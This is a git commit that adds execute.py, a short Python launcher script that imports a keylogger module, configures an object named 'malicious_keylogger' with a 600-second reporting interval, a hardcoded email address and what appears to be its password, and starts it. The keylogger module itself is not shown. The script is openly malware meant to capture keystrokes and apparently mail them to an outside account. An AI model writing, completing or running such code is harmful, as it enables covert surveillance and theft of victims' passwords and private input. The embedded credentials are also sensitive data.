12a9aeb0fa92eae1291d518c5091223f9aa3f100
Jayni Manjrekar <65443419+Jayni2704@users.noreply.github.com>
2021-12-08 20:21:06 +0530

    Add files via upload

---
+++ execute.py
@@ -0,0 +1,12 @@
+#!/usr/bin/env python
+
+import keylogger
+
+
+# Initialize / create keylogger
+
+malicious_keylogger = keylogger.KeyLogger(600, 'manj4@gmail.com', 'uni63J3vE3')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
